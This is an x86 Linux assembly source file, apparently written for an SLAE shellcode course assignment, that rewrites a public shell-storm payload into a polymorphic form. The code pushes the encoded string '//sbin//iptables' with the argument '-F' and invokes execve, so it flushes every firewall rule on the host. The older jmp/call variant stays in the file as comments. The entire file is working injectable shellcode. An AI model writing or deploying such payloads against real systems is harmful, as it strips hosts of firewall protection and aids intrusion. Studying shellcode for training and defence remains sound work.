; Filename: flushIpTbl_poly.nasm
; Author:  Muhereza Herbert
; Website:  http://kilobytesecurity.com
; 
; Orig Source : http://shell-storm.org/shellcode/files/shellcode-842.php
; Orig Size: 51 bytes 
;
; New Size:  bytes
; Purpose: SLAE Exam requirement Assignment Six

global _start			

section .text
_start:

;jmp	short	callme
;main:
	xor eax,eax
	push eax
	push 0x73656c62
	push 0x61747069
	push 0x2f2f6e69
	push 0x62732f2f
	mov ebx, esp
	
	push eax
	push word 0x462d		;The arguments string '-F' in reverse
	mov ecx, esp
	push eax
	push ecx
	push ebx		
	mov ecx, esp			;Addy of addy of null terminated string stored in ebx
	push eax
	mov edx, esp		;EDX = Address of NULLS
	mov al, 11
	int 0x80

	;pop	esi
	;xor	eax,eax
	;mov byte [esi+14],al
	;mov byte [esi+17],al
	;mov long [esi+18],esi
	;lea	 ebx,[esi+15]
	;mov long [esi+22],ebx
	;mov long [esi+26],eax
	;mov 	al,0x0b
	;mov	ebx,esi
	;lea	ecx,[esi+18]
	;lea	edx,[esi+26]
	;int	0x80

;callme:
	;call	main
	;db '/sbin/iptables#-F#'
